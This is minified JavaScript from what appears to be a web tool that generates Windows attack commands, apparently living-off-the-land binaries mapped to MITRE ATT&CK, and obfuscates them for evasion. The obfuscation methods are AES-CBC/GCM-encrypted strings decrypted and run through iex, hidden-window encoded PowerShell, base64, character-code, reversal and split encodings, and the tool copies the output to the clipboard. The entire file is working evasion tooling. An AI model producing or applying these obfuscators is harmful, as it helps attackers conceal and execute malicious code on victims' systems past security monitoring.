function updateSelectBinElem(e){let t=document.getElementById("options_1_bin");t.innerHTML="";const n=Object.keys(PAYLOADS[e]);for(i=0;i<n.length;i++){const e=document.createElement("option");e.value=n[i],e.textContent=n[i],t.appendChild(e)}}function toBase64(e){return btoa(e)}function toBase64UTF16LE(e){const t=[];for(let n=0;n<e.length;n++){const o=e.charCodeAt(n);t.push(255&o),t.push(o>>8&255)}const n=String.fromCodePoint.apply(null,t);return btoa(n)}async function obfsAesCbc(e,t){if("Command Prompt"===t)return"# No available on Command Prompt";{const t=await window.crypto.subtle.generateKey({name:"AES-CBC",length:256},!0,["encrypt","decrypt"]),n=window.crypto.getRandomValues(new Uint8Array(16)),o=await window.crypto.subtle.encrypt({name:"AES-CBC",iv:n},t,(new TextEncoder).encode(e)),a=new Uint8Array(await window.crypto.subtle.exportKey("raw",t));return`$encBytes = [Convert]::FromBase64String("${btoa(String.fromCharCode(...new Uint8Array(o)))}");$aes = [System.Security.Cryptography.Aes]::Create();$aes.Key = $([Convert]::FromBase64String("${btoa(String.fromCharCode(...a))}"));$aes.IV = $([Convert]::FromBase64String("${btoa(String.fromCharCode(...n))}"));$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$decryptor = $aes.CreateDecryptor();$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);iex $([System.Text.Encoding]::UTF8.GetString($decBytes))`}}async function obfsAesGcm(e,t){if("Command Prompt"===t)return"# No available on Command Prompt";{const t=await window.crypto.subtle.generateKey({name:"AES-GCM",length:256},!0,["encrypt","decrypt"]),n=window.crypto.getRandomValues(new Uint8Array(12)),o=await window.crypto.subtle.encrypt({name:"AES-GCM",iv:n},t,(new TextEncoder).encode(e)),a=new Uint8Array(await window.crypto.subtle.exportKey("raw",t)),r=new Uint8Array(o.slice(-16)),i=new Uint8Array(o.slice(0,-16)),s=btoa(String.fromCharCode(...a)),c=btoa(String.fromCharCode(...n)),l=btoa(String.fromCharCode(...r));return`$encPayload = [Convert]::FromBase64String("${btoa(String.fromCharCode(...new Uint8Array(i)))}");$key = [Convert]::FromBase64String("${s}");$nonce = [Convert]::FromBase64String("${c}");$authTag = [Convert]::FromBase64String("${l}");$payload = New-Object byte[] ($encPayload.Length);$aes = [System.Security.Cryptography.AesGcm]::new($key);$aes.Decrypt($nonce, $encPayload, $authTag, $payload);iex $([System.Text.Encoding]::UTF8.GetString($payload))`}}function obfsBase64(e,t){return`powershell.exe -nop -noni -w hid -e ${toBase64UTF16LE(e)}`}function obfsBase64Python(e,t){return"Command Prompt"===t?"# No available on Command Prompt":`iex $(python3 -c "import base64;print(base64.b64decode('${toBase64(e)}').decode())")`}function obfsDoubleQuotes(e,t){const n=e.split(" "),o=n[0].split("");let a=2*Math.floor(Math.random()*((o.length-2)/2+1))+2;for(a=a%2==0?a:a+1,i=0;i<2;i++){const e=o.length,t=2*Math.floor(Math.random()*(e/2))+1;o.splice(t,0,'"')}return`${o.join("")} ${n.slice(1).join(" ")}`}function obfsMultibyte(e,t){let n="";if("Command Prompt"===t)return"# No available on Command Prompt";for(i=0;i<e.length;i++)n+="[char]0x"+e.charCodeAt(i).toString(16).padStart(2,"0"),i<e.length-1&&(n+=" + ");return`iex $(${n})`}function obfsReverse(e,t){if("Command Prompt"===t)return"# No available on Command Prompt";return`$reversed = '${e.split("").reverse().join("")}'.ToCharArray();[Array]::Reverse($reversed);iex(-join $reversed)`}function obfsSplit(e,t){for(chars=[],i=0;i<e.length;i++)" "===e[i]?chars.push("' '"):"'"==e[i]||'"'==e[i]?chars.push("'\"'"):chars.push(`'${e[i]}'`);const n=chars.join("+");return"Command Prompt"===t?"# No available on Command Prompt":`$cmd = [char[]](${n}) -Join '';Invoke-Expression $cmd`}async function obfs(e,t,n){switch(n){case"AES-CBC":return await obfsAesCbc(e,t);case"AES-GCM":return await obfsAesGcm(e,t);case"Base64":return obfsBase64(e,t);case"Base64 (Python)":return obfsBase64Python(e,t);case"Double-Quotes":return obfsDoubleQuotes(e,t);case"Multibyte":return obfsMultibyte(e,t);case"Reverse":return obfsReverse(e,t);case"Split":return obfsSplit(e,t);default:return e}}function genPayload1(e,t){const n=PAYLOADS[e][t];let o=n.cmd;const a=n.cli,r=n.adminRequired,i=n.mitre,s=n.lolbas,c=n.desc,l=document.getElementById("options_1_links_mitre");i?(l.href=i.url,l.textContent=i.id,l.style.display="inline"):l.style.display="none";const d=document.getElementById("options_1_links_lolbas");s?(d.href=s,d.textContent="LOLBAS",d.style.display="inline"):d.style.display="none";const y=document.getElementById("desc_1_p");y.textContent=c||"No additional information.";document.getElementById("payload_1_pre_labels_admin").style.display=r?"inline":"none";const p=document.getElementById("payload_1_pre_labels_cli");a?(p.style.display="inline",p.textContent="Run on "+a):p.style.display="none";document.getElementById("payload_1_pre_code").textContent=o}async function genPayload2(){const e=document.getElementById("options_1_purpose").value,t=document.getElementById("options_1_bin").value;let n=document.getElementById("payload_1_pre_code").innerText;const o=document.getElementById("options_2_obfs").value,a=PAYLOADS[e][t],r=a.cli,i=a.adminRequired;a.mitre;n=await obfs(n,r,o);document.getElementById("payload_2_pre_code").textContent=n;document.getElementById("payload_2_pre_labels_admin").style.display=i?"flex":"none";const s=document.getElementById("payload_2_pre_labels_cli");r?(s.style.display="inline",s.textContent="Run on "+r):s.style.display="none"}async function update1(){genPayload1(document.getElementById("options_1_purpose").value,document.getElementById("options_1_bin").value);const e=document.getElementById("options_2_obfs").value;await genPayload2(e)}async function update2(){const e=document.getElementById("options_2_obfs").value;await genPayload2(e)}async function updatePurpose(){updateSelectBinElem(document.getElementById("options_1_purpose").value),await update1()}function showPopup(){const e=document.getElementById("copied-popup");e.style.display="block",setTimeout((()=>{e.style.display="none"}),3e3)}function copy1(){const e=document.getElementById("payload_1_pre_code").innerText;navigator.clipboard.writeText(e).then((()=>{showPopup()})).catch((e=>{console.error("Failed to copy: ",e)}))}function copy2(){const e=document.getElementById("payload_2_pre_code").innerText;navigator.clipboard.writeText(e).then((()=>{showPopup()})).catch((e=>{console.error("Failed to copy: ",e)}))}updatePurpose();